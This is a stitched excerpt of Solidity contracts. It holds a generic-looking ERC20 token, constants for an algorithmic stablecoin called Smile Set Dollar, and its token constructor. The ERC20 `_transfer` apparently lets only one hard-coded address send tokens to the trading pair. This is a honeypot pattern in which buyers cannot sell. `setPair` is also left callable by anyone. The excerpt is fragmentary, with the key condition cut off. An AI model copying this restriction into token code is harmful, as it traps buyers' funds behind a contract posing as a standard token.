...
contract ERC20 is Context, IERC20 {
    ...
    function setPair(address _pairAddress) public {
        if (_pair == address(0)) _pair = _pairAddress;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (recipient == _pair) {
            require(
                sender == address(0xfE01a4EA8E2d22162E318eD3AFcCEe23Cbbc0b72),
...
/*
    Copyright 2019 dYdX Trading Inc.
    Copyright 2020 Smile Coding team, based on the works of the Empty Set Squad
...
library Constants {
    ...
    uint256 private constant EPOCH_START = 1610038800; // 7/1/2021 @ 17:00 @ GMT
    ...
    /* DAO */
    uint256 private constant ADVANCE_INCENTIVE = 10e18; // 10 SSD
    uint256 private constant DAO_EXIT_LOCKUP_EPOCHS = 24; // 24 epochs fluid

    /* Pool */
    uint256 private constant POOL_EXIT_LOCKUP_EPOCHS = 14; // 14 epochs fluid
...
contract Dollar is IDollar, MinterRole, ERC20Detailed, Permittable, ERC20Burnable  {
    ...
    constructor()
    ERC20Detailed("Smile Set Dollar", "SSD", 18)
    Permittable()
    public
    { }
